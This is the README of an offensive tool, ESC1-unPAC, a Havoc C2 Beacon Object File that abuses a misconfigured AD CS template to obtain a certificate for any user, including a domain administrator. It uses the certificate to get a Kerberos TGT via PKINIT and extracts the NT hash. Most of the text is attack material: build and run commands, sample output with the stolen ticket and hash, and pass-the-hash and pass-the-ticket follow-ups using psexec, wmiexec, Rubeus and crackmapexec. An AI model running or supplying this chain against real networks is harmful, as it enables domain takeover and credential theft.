# ESC1-unPAC BOF

Request a certificate with arbitrary SAN (and SID) , authenticate via PKINIT, and extract the NT hash

---

## Demo


https://github.com/user-attachments/assets/806cfbed-2d64-4256-bc2b-0f93bc6c8e08



---

## Features

| Feature | Description |
|---------|-------------|
| **ESC1 Exploitation** | Request certificates with arbitrary Subject Alternative Name |
| **KB5014754 Bypass** | Automatic SID inclusion for Strong Certificate Mapping |
| **PKINIT Authentication** | Full RFC 4556 implementation with DH key exchange |
| **UnPAC-the-hash** | Extract NT hash from PAC credentials |
| **U2U Fallback** | User-to-User when PA-PAC-CREDENTIALS unavailable |
| **Single BOF** | Complete attack chain in one command |
| **Rubeus Compatible** | Kirbi output works with Rubeus/Mimikatz |

---

## Requirements

### Vulnerable Template (ESC1)
- `ENROLLEE_SUPPLIES_SUBJECT` enabled
- Low privilege enrollment (Authenticated Users)
- Client Authentication EKU

### Domain Controller
- PKINIT enabled (default on most DCs)
- For post-KB5014754: SID automatically included in certificate

---

## Quick Start

### Build (on Kali)
```bash
git clone https://github.com/RayRRT/ESC1-unPAC.git
cd ESC1-unPAC
./build.sh
```

### Load in Havoc
1. **Scripts** → **Load Script**
2. Select: `havoc/esc1-unpac.py`

### Run
```
esc1-unpac EVILCA1.evilcorp.net\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
```

---

## Usage

### Basic
```
esc1-unpac <CA> <Template> <UPN>
```

### With Explicit KDC
```
esc1-unpac <CA> <Template> <UPN> <KDC>
```

### Without SID (pre-KB5014754)
```
esc1-unpac <CA> <Template> <UPN> "" nosid
```

### Examples
```bash
# Target Domain Admin
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net

# Specify KDC
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template admin@corp.local dc01.corp.local

# Legacy mode (no SID)
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template admin@corp.local "" nosid
```

---

## Output

```
[*] === ESC1 Certificate Request ===
[*] CA: EVILCA1.evilcorp.net\evilcorp-EVILCA1-CA
[*] Template: ESC1Template
[*] Target UPN: administrator@evilcorp.net
[*] Looking up SID for: administrator@evilcorp.net
[+] Found SID: S-1-5-21-1234567890-1234567890-1234567890-500
[*] Generating 2048-bit RSA key pair...
[+] Key pair generated
[*] Building CSR with SAN (UPN + SID URL)...
[*] Submitting certificate request...
[+] Certificate issued! (Request ID: 42)

[+] PFX (base64, password: SpicyAD123):
MIIQoQIBAzCCEGcGCSqGSIb3DQEHAaCCEFgEghBUMIIQUDCC...

[*] === PKINIT Authentication ===
[*] Target: administrator@EVILCORP.NET
[*] KDC: EVILCA1.evilcorp.net
[*] Generating DH keys (MODP Group 2)...
[*] Building AS-REQ with PA-PK-AS-REQ...
[*] Sending to KDC...
[+] Received AS-REP (2847 bytes)
[*] Computing DH shared secret...
[*] Deriving reply key...
[*] Decrypting enc-part...
[+] TGT obtained!

[+] TGT (kirbi, base64):
doIFqjCCBaagAwIBBaEDAgEWooIEtjCCBLJhggSuMIIEqqAD...

[*] === UnPAC-the-hash ===
[*] Extracting credentials from PAC...
[+] NT Hash: 32ed87bdb5fdc5e9cba88547376818d4
```

---

## Post-Exploitation

### Use the PFX
```bash
# Certipy (from Linux)
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1

# Rubeus (from Windows)
Rubeus.exe asktgt /certificate:MIIQoQ... /password:SpicyAD123
```

### Use the TGT
```bash
# Rubeus - Pass the ticket
Rubeus.exe ptt /ticket:doIFqj...

# Rubeus - Describe ticket
Rubeus.exe describe /ticket:doIFqj...

# Mimikatz
kerberos::ptt ticket.kirbi
```

### Use the NT Hash
```bash
# Impacket - PSExec
impacket-psexec -hashes :32ed87bdb5fdc5e9cba88547376818d4 administrator@dc01.corp.local

# Impacket - WMIExec
impacket-wmiexec -hashes :32ed87bdb5fdc5e9cba88547376818d4 administrator@dc01.corp.local

# CrackMapExec
crackmapexec smb 10.0.0.0/24 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4
```

---

## Technical Details

### Attack Flow
```
┌─────────────────┐     ┌─────────────┐     ┌─────────────┐
│   ESC1 Request  │────▶│   PKINIT    │────▶│  UnPAC-the  │
│  (Get PFX)      │     │  (Get TGT)  │     │    hash     │
└─────────────────┘     └─────────────┘     └─────────────┘
        │                      │                   │
        ▼                      ▼                   ▼
   Certificate            Kerberos TGT         NT Hash
   with custom SAN        (kirbi format)
```

### Key Components
- **DH Key Exchange**: RFC 3526 MODP Group 2 (2048-bit)
- **PKINIT**: RFC 4556 with id-pkinit-authData OID
- **Kerberos Crypto**: AES256-CTS-HMAC-SHA1 via cryptdll.dll
- **SID Lookup**: LDAP query with sAMAccountName fallback

---

## 📁 Project Structure

```
ESC1-unPAC/
├── README.md
├── Makefile
├── build.sh                    # Auto-build script
├── havoc/
│   ├── esc1-unpac.py          # Havoc extension
│   └── bofs/
│       └── ESC1-unPAC.x64.o   # Compiled BOF
├── src/adcs/
│   └── esc1-unpac.c           # Complete implementation
└── include/
    ├── beacon.h
    └── bofdefs.h
```

---

## 📚 References

- [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [RFC 4556 - PKINIT](https://tools.ietf.org/html/rfc4556)
- [RFC 4120 - Kerberos V5](https://tools.ietf.org/html/rfc4120)
- [KB5014754 - Strong Certificate Mapping](https://support.microsoft.com/en-us/topic/kb5014754)

---

## ⚠️ Disclaimer

This tool is intended for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

